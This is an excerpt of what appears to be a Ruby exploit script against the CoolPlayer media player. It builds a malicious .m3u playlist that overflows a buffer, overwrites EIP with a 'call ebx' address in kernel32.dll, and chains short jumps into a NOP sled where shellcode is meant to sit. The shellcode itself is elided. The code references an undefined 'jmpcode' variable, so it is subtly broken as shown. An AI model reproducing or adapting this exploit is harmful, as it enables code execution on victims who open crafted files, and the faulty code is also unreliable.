...
buffsize = 10000 # EBX
jmpcode1 = "\xeb\x32" # 50 byte short jump to hop over EIP and garbage and into next short jump
junk = "\x90" * (218 - jmpcode.size) # EIP Over write
eip = "\x95\x03\x81\x7C" # Memory address 0x7c810395 -> call ebx kernel32.dll
garbage1 = "\xcc" * 45
jmpcode2 = "\x90" * 6 # 100 byte short jump over garbage 2 and into NOPs/shellcode
jmpcode2 += "\xeb\x64" # 100 byte short jump over garbage 2 and into NOPs/shellcode
garbage2 = "\xcc" * 97
nops = "\x90" * 50
...
sploit = junk + jmpcode1 + eip + garbage1 + jmpcode2 + garbage2 +  nops + shellcode
fill = "\x43" * (buffsize - sploit.size)
buffer = sploit + fill

exploit = "coolplayer.m3u"
File.open(exploit, 'w'){|f| f.write(buffer)}
puts "Exploit file #{exploit} created\n"